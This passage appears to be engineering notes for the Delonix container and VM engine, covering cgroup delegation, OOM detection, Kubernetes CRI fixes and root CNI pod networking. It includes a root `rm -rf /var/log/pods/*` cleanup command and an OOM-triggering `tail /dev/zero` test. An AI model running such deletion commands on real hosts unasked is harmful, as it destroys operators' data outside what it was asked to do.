| `delonix-provider-truenas` | provision dataset/quota/share on a NAS via the API (ADR-0009) — same reason for a separate crate |
| `delonix-provider-powerdns` | minimal client for the API of ONE PowerDNS server, with the credential the operator gives the ENGINE in `providers.yaml` (`type: powerdns`, ADR-0064 D6): removes ONE record `(name, type, content)` keeping the rest of the rrset. Used by the `-bin` (`cmd::dns_cleanup`) to clean up the gateway records the Proxmox node writes and never removes |
| `delonix-provider-opnsense` | remote `GatewayProvider` against the REST API of ONE OPNsense appliance (ADR-0051). Outside `delonix-sdn` for the same reason `delonix-proxmox` is outside `delonix-vm` — an HTTP client does not go into an engine crate; registered by the `-bin` (`cmd::gatewayproviders`), which is who knows the target |
| `delonix-volume` | named volumes and bind mounts |
| `delonix-provider-btrfs` | `btrfs` pool driver (ADR-0067 P2): a volume is a subvolume with the ownership mark; the per-qgroup quotas and the `create-pool`/`destroy-pool` go through the helper |
| `delonix-provider-zfs` | `zfs` pool driver (ADR-0067 P3): datasets with ownership in a `delonix.io:owner` property; the privileged operations go through the helper |
| `delonix-provider-lvm` | `lvm-thin` pool driver (ADR-0067 P4): thin volumes with ownership labels, refuses at 95% data or metadata; everything through the helper |
| `delonix-provider-ceph` | native Ceph support (ADR-0081): four surfaces of one and the same cluster reached through the storage `Run` port (never linking `librados`) — RADOS (`ceph status`), RBD (a block `StoragePoolDriver`), CephFS (one volume per subvolume) and RGW (S3 identities and buckets) |
| `delonix-cri` | CRI server (`runtime.v1`) — lets Delonix serve as a runtime to a `kubelet` |
| `delonix-mgmt` | LOCAL management API (HTTP+JSON on a unix socket, own uid only) for an external control-plane, plus the shared Prometheus registry and the OpenTelemetry spans. It is not remote, and `cli-stability.md` says automation should not be built on it — see ADR-0010 |
| `delonix-scanner` | SBOM + CVE scanning (`image scan`, and the scan-on-pull enforcement) |
| `delonix-mcp` | Model Context Protocol server (ADR-0025) — LOCAL and tenant-less AI control surface, `stdio`-only at this phase; the tools call the `Store`/the domain crates, never build an arbitrary shell |
| `delonix-mcp-bin` | the `delonix-mcp` executable (P3l, ADR-0040 D2.4 amended): `delonix mcp` does `exec` of it, and the user and an AI client's configuration only name `delonix`. It composes a single interface, `delonix-mcp` |
| `delonix-mgmt-bin` | the `delonix-mgmt` executable (P3m): `delonix serve api` does `exec` of it. `delonix` still links the `delonix-mgmt` crate, but only through the `dashstats` collector (used by `dash` and `system`), which leaves for the application layer in P5 |
| `delonix-node-api` | the `delonix.node.v1` node contract SERVED (ADR-0040 P5, ADR-0042 step C): gRPC and HTTP/JSON from the same `.proto`, on a local unix socket, own uid only. It serves the `NetworkService` — the reads (`GetNetwork`, `ListNetworks`: `etag`/`ETag` and 304, `label_selector`, pagination with `Link rel=next`) and, since slice E2, `CreateNetwork`/`DeleteNetwork` —, the reads of the `VolumeService` (`GetVolume`, `ListVolumes`, slice E3) and the `OperationService` (`GetOperation`, `ListOperations`): each mutation responds with an `Operation` persisted in `<root>/operations/` before the work (ADR-0042 step E) and the `NodeService` — the entry `GetApiRoot` (`GET /v1`, with `links` to everything that is served), `GetNodeInfo`, `GetHealth`, `GetCapacity` (ADR-0042 C1) and `ListProviders` (ADR-0050 D5) — the `GET /openapi.json` and the pages `GET /docs` (Swagger UI) and `GET /redoc` (embedded assets, `third_party/node-api-docs`); `WatchEvents` answers UNIMPLEMENTED naming the step that brings it. The REST routes are GENERATED in `build.rs` from the `google.api.http` annotations (`transcode`): a contract route not yet served answers 501 (DX-6001), a path outside the contract 404. The generated stubs (prost/tonic) and the proto3 JSON (`pbjson`, proto names) live here, like the CRI's |
| `delonix-node-api-bin` | the `delonix-node-api` executable: `delonix serve node-api` does `exec` of it, with `--addr`/`DELONIX_NODE_API_ADDR` (default `unix:///run/delonix-node.sock`) |
| `delonix-storage-helper` | the `delonix-storage-helper` executable (ADR-0067 P1): root helper socket-activated (`Accept=yes`, one request per process), which serves `probe`/`usage`/`allocate`/`release` to the administrator's allowlist pools, with the uid from `SO_PEERCRED`; `create-pool`/`destroy-pool` only in a terminal as root |
| `delonix-security` | the node's security decisions: the policy (`policy.json`), the **single** admission point — container **and** VM —, the `SecurityEvent`, the explainable score and secret redaction. Pure: three dependencies, no sensors, no daemon and **no notion of tenant** (guard-rail #2, enforced by test) — see ADR-0026 |
| `delonix-host` | the host adapter (ADR-0040 R2, the split of `delonix-node`): the process-and-file mechanism that the engine servers and the adapters share — atomic write, advisory `flock`, the dispatch contract between `delonix` and the sibling servers and the local socket's peer cred. It is an adapter that the other adapters and providers can depend on directly (A1) |
| `delonix-pool-helper` | the protocol of the PRIVILEGED storage helper (ADR-0067 D3; pulled out of the Storage context into an adapter of its own, ADR-0040 R2c): the pool operations that need root (everything LVM does, mounting a ZFS dataset) cross through it to `delonix-storage-helper` |
| `delonix-warm` | the **warm plane** pool (ADR-0095): keeps pre-loaded *runners* (`delonix __poolrunner`) — binary in memory, stores open, image resolved — that eliminate the cold-start `pre_spawn` on the paths with a live process (CRI/API) or *opt-in*. Serve-one-then-exit (the supervisor's `fork()` always runs single-threaded); it only orchestrates processes and a line protocol over `UnixStream` — it does not know images or the engine |
| `delonix-cri-bin` | the `delonix-cri` executable: `delonix serve cri` does `exec` of it, assembles the `Engine` (ADR-0040) and serves the CRI `runtime.v1` to the `kubelet`. It composes the `delonix-cri` interface with the `delonix-host` adapters and the `delonix-telemetry` observability |

## History

Extracted from `delonix-paas` via `git filter-repo` (real history preserved, not a squash) —
see the `delonix-paas` skill in the control dir for the origin product.


## VMfile, `vm build` and `--network` (v0.44.0/v0.45.0)

`delonix vm init --vmfile` generates the skeleton, `vm build` builds the qcow2, `vm create --url-img`
boots from a published qcow2. `FROM` is a **cloud image** (ubuntu/debian/rocky or an absolute
URL), not an OCI image — it is cloud-init that makes the first boot apply hostname, keys
and accounts. Multi-stage with `COPY --from=` (each stage is a whole DISK, not a layer).

- **`--no-network` is the default and `--network` is opt-in**, in the three paths (`vm build`,
  `image vm build`, `image --vm build`); in the golden recipe it is refused, because there whoever decides is
  `--offline`. v0.44.0 shipped with a skeleton that said "*Builds as written*" and whose first
  `RUN` was `apt-get install` — impossible offline. Offline stays correct by default (a build
  that goes to the internet gives a different image depending on the day), but the most common thing you want to
  do to an image is install a package, and an engine that makes it impossible does not offer a
  choice: it refuses.
- **The injected key goes to the `delonix` account**, not the distro's default. On an Ubuntu cloud
  image the guess is `ubuntu`, that account EXISTS and does not have the key — it answers
  `Permission denied (publickey)`, which reads as a broken key and not as the wrong name. That is why
  the `vm create` next-steps block prints the exact `ssh` (only in the path where the seed is
  generated by us; with a `--seed` of your own we would be guessing).
- **Validated live**: `vm create --url-img` end-to-end (download, overlay, NoCloud seed,
  boot in libvirt, cloud-init applied, SSH inside). `vm build` is proven up to the boundary
  of `virt-customize` (download + `SHA256SUMS` + flattening + `SIZE` before any `RUN`);
  `virt-customize` itself **remains unexercised** — the development machine does not have
  `libguestfs-tools` and `install.sh` does not install it.

## cgroup delegation: `cpu` fatal, `cpuset`/`io` optional (v0.44.0)

Fix to a wrong recommendation that had been published: **`sudo delonix system setup
--delegate` was not the fix** for this host. Measured on a factory Ubuntu 24.04:

- the `user@.service` already brings `Delegate=pids memory cpu`, and the `subtree_control` of
  `user@<uid>.service` is already the user's — delegation was not missing, it was done;
- what `cpu` lacked was the **slice WHERE the command runs** (`app.slice`, the editor's scope),
  and no drop-in under `/etc` touches it;
- **`cpuset`/`io` can never appear**: the `user.slice`, which is root's, only passes
  `cpu memory pids` down. Asking for them is asking for what the ancestor does not have to give.

Hence: `missing` (only `cpu` — a Kubernetes node does not boot without it) and `absent` (`cpuset`/`io`, the
normal state) are DIFFERENT facts; remedy 1 is `systemd-run --user --scope -p Delegate=yes`
(no root, no session restart) and the drop-in under `/etc` is remedy 2, only for when 1 still flags
`cpu`. `install.sh` **skips** the drop-in on a host that already delegates `cpu`. Test that pins the
distinction: `so_o_cpu_e_fatal_para_um_no_kubernetes`.

**Trap of this shell's own cgroup**: within a session it can CHANGE between invocations (the editor's
scope gained `cpu` in the middle of a 2026-08-09 session), and the same command refused and then
went through. `system setup` and the `cluster create` preflight read the same thing; what varies is the
host.

**Addendum (2026-09-27): "optional" only for a Kubernetes node.** For whoever asks for the limits that
those controllers carry, the absence was a lie with rc=0. Measured on this host with engine
4.4.0 (`user@1000.service` with `cpu memory pids`): `container run --device-write-bps 5mb` wrote
at 1.6 GB/s and exited 0, with a warning saying to use `systemd-run --user --scope -p Delegate=yes`
— and that scope, run for real, **stayed at 1.2 GB/s**: a scope only gets what the
`user@.service` has. Now `--cpuset`, `--io-weight` and `--device-*` are REFUSED before creating
anything (exit 69, `preflight_controller_limits`, valve `DELONIX_ALLOW_UNENFORCED_LIMITS`), with a
probe per controller (`leaf_controllers` in `delonix-linux`) because `cgroup_limits_apply` passes
on a host that delegates `cpu memory pids`. `system setup` lists them in `refused:` and stopped saying
"nothing here needs them". The remedy the error points to is the drop-in `Delegate=cpu cpuset io memory
pids` in the `user@.service`: whoever writes the `subtree_control` of the `user.slice` is systemd (PID 1), not
the user, so the "can never appear" above holds for what you can get WITHOUT root. Measured
on 2026-08-19 in a VM (role `cgroup_delegation`): with the drop-in AND the restart of the `user@`,
`--device-write-bps 4mb` gave 4.0 MB/s against 2.7 GB/s with no ceiling; **only the `daemon-reload` is a false
green** (the `user@` shows `io` and a new scope is born without it), so the error names the
`systemctl restart user@<uid>.service`. Not re-measured on this host (requires root). Tests that fail if the warning returns:
`controller_limits_preflight_tests` in `cmd/container.rs`.

## A container's cgroup disappears with it (measured 2026-08-09)

Relevant for whoever does the CRI's `OOMKilled`, which is one of the real gaps: **there is no
possible post-mortem detection**. Measured with a `tail /dev/zero` under `-m 48M`:

- in life, the cgroup is at `…/user@<uid>.service/dlx-containers/dlx-<id>` (the escape base,
  so it SURVIVES the ephemeral scope from which the command was launched);
- the container dies in ~1s and, with no command of ours running between the death and the read, the
  directory **no longer exists** — `memory.events`/`oom_kill` are not readable afterward;
- the record stays `status: Crashed` with `crash_reason: null`, and the CRI reports
  `reason: "Error"` (the `container_status` only knows `Completed`/`Error`).

Therefore the `oom_kill` has to be captured **live** by whoever already lives as long as the container
— the natural candidate is the log shim, which is the only per-container process that exists in this
model — and persisted in the record. Do not try to read it afterward: the information is no longer there.

**CLOSED (2026-09-15) — and the natural candidate was another.** Measured at 20 ms: `oom_kill 2` in
`memory.events`, and the directory gone 20 ms later **with the record already `Crashed`** before
any command of ours ran. Who deletes the cgroup is the **supervisor** that `run -d` always
forks (`wait_and_record`), and the foreground `waitpid` of `create_with` does the same. They are the
only ones that see the death with authority, so that is where it is read: the cgroup path and the
baseline of the counter BEFORE the `waitpid` (the `live_cgroup` reads `/proc/<pid>/cgroup`, which the reap
takes away), and the counter again AFTER, before the `remove_container_cgroup`.

- **A RISE of the counter, never `> 0`**: a leaf that survived (a failed `rmdir`, the leaf of
  a deliberately reused Kind node) carries the old count, and `> 0` would call OOM on a
  `kill -9`. And only for `Crashed`/`Failed` — a child killed by OOM under an init that exited 0
  is not an OOM death.
- **`memory.events.local` first**: the `memory.events` is hierarchical, and the leaf of a Kind node
  contains a whole systemd tree — the OOM of a pod inside it would read as the NODE having been killed.
- **Not on top of a requested `stop`**: there the cause is the operator, whatever the counter does.
- The reason reaches the consumers: `container ls`/`describe` show `Dead (OOMKilled)` (a `Dead`
  alone reads the same for an OOM and for a `kill -9`, and the remedies are opposite), and the CRI
  responds `reason: OOMKilled`, the string the kubelet and `kubectl describe` already know.

**And the CRI applied no limit at all, so the CRI's `OOMKilled` could never happen.**
The first proof via `crictl` gave `Error`/exit 1, and the engine's record explained why:
`memory_max: 6646M`, the engine's default, for a 48 MiB request. The `linux.resources` of
`CreateContainer` was read by no one — a pod's memory and CPU `resources.limits`
never reached the container, with no warning, and the scheduler thought it limited. The
`CriResources` keeps them in the record and `start_argv` translates: `-m`, `--cpus` (quota/period),
`--cpu-weight` (shares via the runc/crun linear map) and `--cpuset`. Validated with `crictl`
for real: `memory_max: 50331648`, and then `exitCode 137`, `reason OOMKilled`.

**Undecided, and it is policy, not code**: a pod WITHOUT limits still inherits the engine's
defaults (a quarter of memory, at most 1 core), because the engine refuses by design a container
without a CPU ceiling (`--cpus` does not accept `max`). For Kubernetes "no limit" is no limit, and an
etcd stuck at 1 core is the same silent throttling. The `UpdateContainerResources` also
stays `todo`.

**The combination #307 + #309 left a NEW root node unable to start pods, and only a real kubelet
showed it** (2026-09-15, VM from `delonix-vm-k8s:1.36`, k8s 1.36.4). The #307 refuses `-m`/`--cpus`/
`--cpu-weight` when `cgroup_limits_apply()` says "no delegation"; the #309 started sending
`--cpu-weight` for every pod with CPU requests — the control-plane static pods included.
In root mode the probe was a `create_dir` of `delonix.slice/.delonix-probe-<pid>`, and the slice only
is born with the first container: on a node where nothing has yet run it gave ENOENT → "no delegation" →
every limited pod refused → the slice never got born. **477 failed `StartContainer`** and the
`kubeadm init` dead at `wait-control-plane`, on a node with `cpuset cpu io memory pids` all
delegated. It unstuck the moment a container WITHOUT limits created the slice by hand — the proof
of cause. `root_slice_writable` creates the slice as `setup_cgroup` would create it; on the same node
restored, zero failures and the init completed.

- **The kubelet saw only "failed to start container <id>"**: the `start_container` used the variant
  that throws away stderr, next to a `delonix_detached_why` that already documented the SAME
  trap for the sandboxes. It now carries the engine's reason.
- **And stderr goes to a FILE, never a pipe**: a `run -d` holds the descriptors it
  inherited, and a pipe read with `.output()` would hang the `StartContainer` for the life of the pod.
  Measured afterward: no process holds a deleted `.err`.
- **Control with the kubelet, and the right control** (pointed out by the user): not the v0.66.0 that
  comes in the image, but the v3.1.0 immediately before the merges (`fa8c6297`) — both builds say
  `3.1.0`, only the commit tells them apart. The same script on a restored node: v3.1.0 → init ok, apiserver
  2/24 samples, 20 `StopContainer`; `main`+fix → init ok, 0/24, 19. One run of each:
  indistinguishable. **The single-node control-plane in this image goes into a crash-loop from before
  this series** — the kubelet stops the etcd (SIGTERM) in a cycle — and that stays to be investigated separately.
- **Two findings from the real kubelet, closed afterward**: the eviction manager failed to get the
  statistics ("stat failed on /var/lib/delonix/containers/cri-<id>: no such file"), closed in
  #316; and the node stayed `NotReady` through `BridgeMissing` (`delonix0`) with a bridge CNI
  configured, closed further below in "node `NotReady` through `BridgeMissing`".

### RESOLVED — the single-node control-plane crash-loop was the `cpuset` disappearing (2026-09-15)

**Cause**: the CRI's `RuntimeConfig` answered `linux: None`, and the kubelet kept the
`cgroupDriver` from its config — `systemd`, kubeadm's default. It created the pod cgroups as
**empty** systemd slices (the containers live in `/delonix.slice/delonix-<id>`, outside them), and
systemd removes a controller from a slice when no unit underneath asks for it. What it removes
is the `cpuset`. The kubelet, in `SyncPod`, validates the pod cgroup against the node's controllers; with
`cpuset` missing it gives "the cgroup does not exist" and, if the pod already had a container running, it does
`killPod` **without a log line of its own**. The sandbox stays NotReady, and the next sync records
`SandboxChanged` and recreates it with attempt+1. That is why the symptom looked like a sandbox problem.

**How it was proven** (VM from `delonix-vm-k8s:1.36`, k8s 1.36.4, kubelet at `--v=4`):
1. The kills come right after `"Got phase for pod"`, with no `computePodActions` in between, and with
   the probes passing. That is the kubelet's `!pcm.Exists(pod) && !firstSync` path.
2. A 100 ms watch over `kubepods.slice/*/*pod*.slice/cgroup.controllers` showed the `cpuset`
   coming and going, with each kill inside a window without it.
3. **On demand**: a `systemctl daemon-reload` removes it from `kubepods.slice` and from
   `kubepods-burstable.slice` on the spot. A `Delegate=yes` scope inside the pod's slice
   (`systemd-run --scope --slice=… -p Delegate=yes`) holds it through two reloads, and when stopped it falls
   again. This is why containerd/runc does not have the problem: each container is a delegated
   scope inside the slice.
4. **Control by intervention**, with the same node restored and only the driver changing
   (`KubeletConfiguration.cgroupDriver: cgroupfs`): `/livez` 84/84 in 7 min, 0 `StopContainer`,
   0 `SandboxChanged`.

**Fix**: `engine_cgroup_driver()` → `CGROUPFS`, which is what the engine is (it writes to
`/sys/fs/cgroup` and never asks systemd for units). The kubelet 1.36 uses the CRI's value and ignores
the config's (`"Using cgroup driver setting received from the CRI runtime" cgroupDriver="cgroupfs"`).
With the **original** `kubeadm init`, without touching the config: `/livez` 24/24, then 60/60 with ten
`daemon-reload` in between, 0 kills, and the control-plane with `RESTARTS 0` at 7 min. Before it was
20 stops in 3 min. `SYSTEMD` is the ZERO value of the proto, so a `None` or a default reopens the
bug. The test `the_kubelet_is_told_cgroupfs` fails with the fix reverted (verified).

Three traps from this investigation:
- **The `RESTARTS` is inherited between `kubeadm init`s**: the UID of a static pod is the same when the
  manifest is equal, and the kubelet counts the restarts by the `N.log` in `/var/log/pods`, which the
  `kubeadm reset` does not delete. `RESTARTS 6` with a single container `Up 7 minutes` was inheritance.
  To measure, delete with `sudo sh -c 'rm -rf /var/log/pods/*'` (the glob outside the `sh -c` is
  expanded without permission and deletes nothing).
- **The first 2 minutes deceive**: the baseline run gave 23/24 on `/livez` and looked healthy. The
  cycle speeds up afterward, and it was necessary to count `StopContainer` besides `/livez`.
- **This does NOT close point 1 of ADR 0038**: the containers still live in `delonix.slice`, outside the
  kubelet's hierarchy (Node Allocatable, QoS, pod limits). Only placement in a transient scope
  under the `cgroup_parent` lets you answer `SYSTEMD` truthfully.

The kube-proxy in CrashLoopBackOff and the node `NotReady` through `BridgeMissing`, which stayed to be done
here, are in the next section. The eviction manager without statistics and the `kubeadm reset` with orphans
were closed in #316 (see "CRI on a kubeadm node" above).

### RESOLVED — node `NotReady` through `BridgeMissing`: in root the CRI never had pod network (2026-09-15)

Measured on a VM from `delonix-vm-k8s:1.36` (k8s 1.36.4, CRI in root via systemd, no
`DELONIX_CNI=1`) with `/etc/cni/net.d/10-bridge.conflist` (bridge `cni0`, host-local
`10.244.0.0/24`). Control = binaries from `origin/main`, and the same `kubeadm init` on a snapshot
restored: node `NotReady` with `BridgeMissing: bridge 'delonix0' does not exist in /sys/class/net`, and
the CoreDNS `Pending`. **The `BridgeMissing` hid five defects in a queue**, each one only visible
after the previous one got out of the way:

1. **The `NetworkReady` in root measured something that cannot exist.** The native bridge lives in the
   holder's netns (`unshare --user --net`, also in root), never in the host's `/sys/class/net`.
2. **And the root path of `RunPodSandbox` never worked**: it called `pod create cri-<id>
   --network`, which clap refuses (`unexpected argument 'cri-…' found`, because `pod create` only
   accepts `-f`). The call comes from the initial commit, and the native infra in root did not even come up (`control
   socket: No such file or directory`). The `BridgeMissing` covered this up because no pod got scheduled.
   **Decision**: in root the pod network is the node's CNI chain, on the host, as in
   containerd. Named netns `/run/netns/cri-<id>`, `ADD` of the plugins (the same function
   `cni::attach_named_netns` that the rootless holder uses), and the containers enter through
   `nsenter --net` with `--net host`. The `NetworkReady` measures the same fact the sandbox uses
   (`cni::readiness`: the config parses, and all binaries, `ipam.type` included, are in the
   `CNI_PATH`). **Never the bridge**, which only the first `ADD` creates: asking for it would reopen the
   impasse "not ready → no pod → nothing creates it". No config: `NetworkPluginNotReady`, and the sandbox is
   refused with the reason. The `DEL` uses the conflist saved in the sandbox record. Rootless stays as
   it was (`DELONIX_CNI=1`, opt-in).
3. **A non-root `USER` with `--cap-drop ALL` would not boot** (the CoreDNS: uid 65532, `drop: ALL`).
   The `setuid` ran after the `drop_capabilities`, and the message spoke of subuid for what was
   a missing capability. The swap moved to before, with `PR_SET_KEEPCAPS` (runc's order).
   The process still reaches the `execve` with `CapEff 0` (measured).
4. **`--privileged` did not leave `/proc/sys` writable**: the `mask_proc_paths` remounted it
   read-only always, undoing #237 in the engine. kube-proxy: `nf_conntrack_max: read-only file
   system`. Measured both ways: with `--privileged` it writes, without it it stays refused.
5. **The CRI never passed an environment variable to a container**: nobody read the
   `ContainerConfig.envs`. CoreDNS: `KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT must be
   defined`. They go through `--env-file0` (internal: `KEY=VAL` separated by NUL, the format of
   `/proc/<pid>/environ`), in a 0600 file in `cri/env/`, which is deleted on `RemoveContainer`.
   **Not via argv**, because a `run -d` keeps the command line visible in `ps` for the life
   of the pod. **Nor via `--env-file`**, which trims spaces and reads line by line, and so spoils a
   certificate coming from a Secret. In the CRI's JSON record only the file path remains.

And the sixth, which was no longer a defect but policy: the CoreDNS running as 65532 gave `listen tcp
:53: bind: permission denied`. The containerd 2.x sets `ip_unprivileged_port_start=0` and
`ping_group_range` in each pod netns (`enable_unprivileged_ports`/`_icmp`). The CNI sandbox in
root does the same, and applies the pod's `net.*` there on top (under `--net host` the engine would refuse them),
in a thread that does `setns` and writes to `/proc/sys/net`, without a shell.

**Proof, on the same node restored, with the original `kubeadm init`**: node `Ready`, CoreDNS `1/1 Running`
with `10.244.0.2`/`.3` and 0 restarts, `dig @10.244.0.2` and `dig @10.96.0.10` answering, deleting a
pod frees the netns and the lease (the replacement receives `.4`), busybox deployment 2/2 with pod IP, and
`wget http://web.default.svc.cluster.local` from another pod balanced across the two replicas.

**Not measured**: the rootless CNI path after it came to share the body of the `ADD` (which now
brings up `lo` and does `DEL` when the `ADD` fails), and more than one node. The `hostPort` on a CNI sandbox
in root also stays to be done: it is not published through the native ingress, and the `portMappings` does not yet
reach the `portmap` plugin as `runtimeConfig`. The port-forward in root still looks for the
container `pod-cri-<id>`, which this path does not create.
## The CRI places containers in the kubelet hierarchy (ADR 0038, phase 1)

The `cgroup_parent` that the kubelet sends on each `RunPodSandbox` was being ignored: every container
went to `delonix.slice`, outside the place where Kubernetes applies Node Allocatable, QoS and the
pod's limits. And a pod without limits inherited the house ceiling (the etcd at 0.85 cores). Now:

- **`KubeCgroupParent::parse` (core) is the privilege boundary.** The value arrives over the CRI
  socket and becomes a path where the ROOT runtime writes a process. A systemd slice (`*.slice`, no
  `/`, no empty component between hyphens) or an absolute cgroupfs path, segment by segment;
  `..`, relative paths, the root and `delonix.slice` itself are **refused, never rewritten**. The
  validation runs at the start of `RunPodSandbox`, before the netns exists.
- **systemd driver → transient scope requested from systemd** (`busctl call … StartTransientUnit`,
  `Slice=`, `Delegate=yes`), with the limits as properties — it is systemd's delegation contract
  and what runc uses. The name carries the container's pid because a restart calls
  `create_with` again from the same supervisor with the old scope still occupied.
- **The supervisor enters the scope with the container**, and this is no ornament: systemd deletes the
  scope's cgroup the moment it becomes empty, and with it the `memory.events` that #309 reads to detect
  OOM. Measured in the spike; with the supervisor inside, the counter survives, and it is systemd that cleans up
  when the supervisor leaves. Cost: the supervisor's few MiB count against the pod.
- **cgroupfs driver → leaf `<parent>/delonix-<id>`**, and the controllers are enabled **one by one and only
  the ones the parent offers**: the kernel refuses the whole line if ONE controller is missing, and a pod with
  `cpu memory pids` ended up with no controller at all.
- **"Unspecified" is only "no limit" under the kubelet** (`kube_default_limits`, pure): with
  the hidden flag `--kube-cgroup-parent`, a missing `-m`/`--cpus` becomes `max`; without it, the house
  ceiling stays exactly as it was. It is the condition the ADR sets for the two changes to land
  together — without the kubelet hierarchy, the house ceiling is the only protection that exists.
- **PRE-EXISTING BUG that this made reachable**: on the path WITHOUT userns, a failed
  `setup_cgroup` returned the error with the container ALREADY running — outside any ceiling and holding the
  descriptors the caller expects. A `run -d` hung indefinitely (measured, with a cgroupfs
  parent lacking controllers). The path WITH userns already killed the child; the other one now does so too.
  Measured afterward: error in 95 ms, with the reason, and zero processes of the failed container alive.

**Validated live** on a root node (`delonix-vm-k8s:1.36`, systemd 259) with `crictl`, without a kubelet:
scope under the pod's slice with `memory.max 67108864`, `cpu.max 50000 100000`, `cpu.weight 20`,
`swap 0` and the supervisor inside; without limits → `max`/`max`/`max`; a container exhausting 32 MiB
→ `exit 137`, `reason OOMKilled`; cgroupfs → leaf at `/kubepods/burstable/pod…/delonix-<id>`; parent
with `..` → `InvalidArgument`; sandbox without parent → `delonix.slice` and house ceiling unchanged.

**To do (ADR 0038, following phases)**: validation with a stable kubelet — blocked by the
control-plane crash-loop, investigated separately. The eviction manager statistics and
`oom_score_adj` were closed next (#316, and the `CriResources`/`apply_resources` section
below); `cpuset_mems`/`unified`/hugepages and `UpdateContainerResources` are in the two following
sections — the ADR thus ends with its four items implemented.

## `cpuset_mems`/`unified`/hugepage_limits: honour-or-refuse on the CRI path (ADR 0038 item 3)

Phase 1 put the container in the right place; what was missing was the rest of item 3 — and, measuring before
writing code, it turned out that the CRI **had no preflight at all**, not even for what was already
implemented (`cpuset_cpus`). `oom_score_adj` already wrote correctly (it goes through no
controller, it is a plain `/proc/<pid>/oom_score_adj`); `cpuset_mems`, `hugepage_limits` and
`unified` did not even reach `RunOpts` — the `CriResources` in `lifecycle.rs` did not have them.

- **`CriResources` gained the three proto fields** (`cpuset_mems: String`, `hugepage_limits:
  Vec<(String, u64)>`, `unified: Vec<(String, String)>` — `unified` ordered in `from_cri`,
  so a `HashMap` iterated in different orders never compares as distinct requests).
  `apply_resources` translates them into the three new fields of `RunOpts`/`Container`
  (`cpuset_mems`/`hugepage_limits`/`unified`), marked "set only by the CRI" as
  `kube_cgroup_parent`/`oom_score_adj` already were — there is no `container run` flag for any of them.
- **The refusal lives in `refuse_unenforceable_resources`, called in `start_container` before
  `start_run_opts`** — before `StartContainer` reports success, the same discipline as #307
  for `-m`/`--cpus`/`--cpuset` on the CLI. A testable three-way split: `validate_resource_paths`
  (refuses a `page_size`/`unified` key with `/`/`..` — both become part of a FILE path,
  `hugetlb.<page_size>.limit_in_bytes` or the key itself), `wanted_resource_controllers`
  (which controller each requested field needs — `cpuset_mems`→cpuset, `hugepage_limits`→hugetlb,
  each `unified` key by the PREFIX before the first dot, the cgroup v2 naming convention
  itself) and `resources_decision` (PURE, tested with no cgroup2 tree at all — the same cut as
  the CLI's `controller_limits_decision`).
- **The probe's "DOES IT WALK" depends on WHERE the container will actually live**: without the sandbox's
  `cgroup_parent`, `delonix_linux::leaf_controllers()` is asked (the same slice/leaf a `container
  run` uses); with it, the `cgroup.controllers` of the PARENT ITSELF is read (`parent_cgroup_controllers`)
  — the engine's slice is not where that container will live (ADR 0038 item 1). Asking the wrong
  place would have refused legitimate requests under a well-delegated `cgroup_parent`, or accepted
  requests the kubelet's parent cannot handle at all.
  `DELONIX_ALLOW_UNENFORCED_LIMITS` is the same valve as the CLI, with `tracing::warn!` instead of
  `eprintln!` (it is a server, not a command).
- **The HONOUR side**: `cpuset.mems` got the same treatment `cpuset.cpus` already had on the
  THREE write paths (rootless delegated leaf, root slice without parent, cgroupfs leaf of the
  kubelet's parent — this last one HARD-FAILs via `write_limit`, as `cpuset.cpus` already did there).
  `hugepage_limits`/`unified` got the same on all three, **best-effort** on the first two and on the
  systemd arm (no D-Bus property for either — they are written directly into the
  `scope_dir`, after confirming the pid is already inside), **hard-fail** on the cgroupfs arm.
  The systemd arm gained `AllowedMemoryNodes` as a unit property (the same `cpuset_to_mask`
  that already served `AllowedCPUs` — it is a generic list-of-numbers→bitmask, not CPU-specific).
  `"hugetlb"` entered the four lists of controllers to enable in `subtree_control`
  (`try_delegated_base` × 2, `enable_slice_controllers`, the cgroupfs arm of `setup_kube_cgroup`)
  — without this, even a host with hugetlb available in the kernel would never see it delegated to the leaf.
- **No validation of `page_size`/`unified` value beyond path tracing**: the kubelet
  already normalizes `"2MB"`/`"1GB"` before sending them, and `unified` itself is, by proto
  definition, a raw `(cgroup v2 file, value)` pair — rewriting the kubelet's validation would be a
  second undocumented opinion over a contract that is already its own.
- **Not validated live** (needs a stable kubelet against a node with hugetlb configured,
  blocked by the same control-plane crash-loop cited above): only unit/pure tests of the
  three decision functions and of the cgroup argv/writes.
- **Closed this item's twin gap, which this section had left undone**: `cpuset_cpus`
  entered `wanted_resource_controllers` alongside `cpuset_mems` — it had been wired in
  `apply_resources` all along and never had any preflight (the ADR's own context note already measured
  this: "nproc 32 inside a container that requested 0-1").

## `UpdateContainerResources`: the live, placement-aware update (ADR 0038 item 4)

Item 1 put the container in the right cgroup; item 4 was the missing piece to move it AFTER it was
created — `UpdateContainerResources` always answered `todo`, and it is the RPC that the kubelet's in-place
resize (KEP-1287) and `crictl update` call.

- **`CriResources::merge_update`** — the design's key: the CRI does not distinguish, on the WIRE, "unspecified"
  from "don't touch" — both are zero/empty in the proto. In `CreateContainer` that
  means "no limit" (nothing to inherit, fresh state); in `UpdateContainerResources` it means
  "leave as is" (a kubelet resize, or a `crictl update --memory X`, send only what
  changed). Replacing the whole record would erase all the OTHER fields the instant
  one is updated — `merge_update` does the merge field by field, PURE and tested. `cpu_quota`/
  `cpu_period` merge as a PAIR (touching only one replaces BOTH with what the request brought, never
  mixing a new one with the old other — such a request is not a shape any kubelet or
  `crictl` produces, and it is documented rather than hidden).
- **The refusal is the SAME as `StartContainer`'s**: `refuse_unenforceable_resources` runs before
  any write, against the same question (does the leaf where this container ACTUALLY IS have the
  controller?) — zero new validation code.
- **`delonix_linux::update_kube_resources`** — `update_limits` extended to item 3's fields and
  sensitive to the PLACE (item 1): under a kubelet systemd scope, `SetUnitProperties` (only the
  properties the request brought — the rest stays as it was, which is what `SetUnitProperties`
  already means); otherwise, a direct write to the leaf, as `update_limits` always did.
  `hugepage_limits`/`unified` have no systemd property and are written directly to the
  scope/leaf cgroup in both cases. `oom_score_adj` writes to `/proc/<pid>/oom_score_adj`
  from outside (`apply_oom_score_adj_external`, sibling of the one init itself already wrote to itself).
- **`memory_bytes_or_unlimited`/`cpu_quota_usec_or_unlimited`/`cgroup_weight_value`** moved out of
  `kube_limits` to be shared with `unit_properties_for_update` — the same
  size-or-"max"→bytes conversion that creation already did, without copying the logic.
- **`unit_properties_for_update` knows how to request "no limit" explicitly** (`memory`/`cpus` with the
  literal value `"max"`): omitting the property would leave `SetUnitProperties` untouched and the OLD
  ceiling in force — the opposite of what "max" asks.
- **Validated live** (isolated root, `alpine:3.19`, the five sibling binaries, without `cgroup_parent`
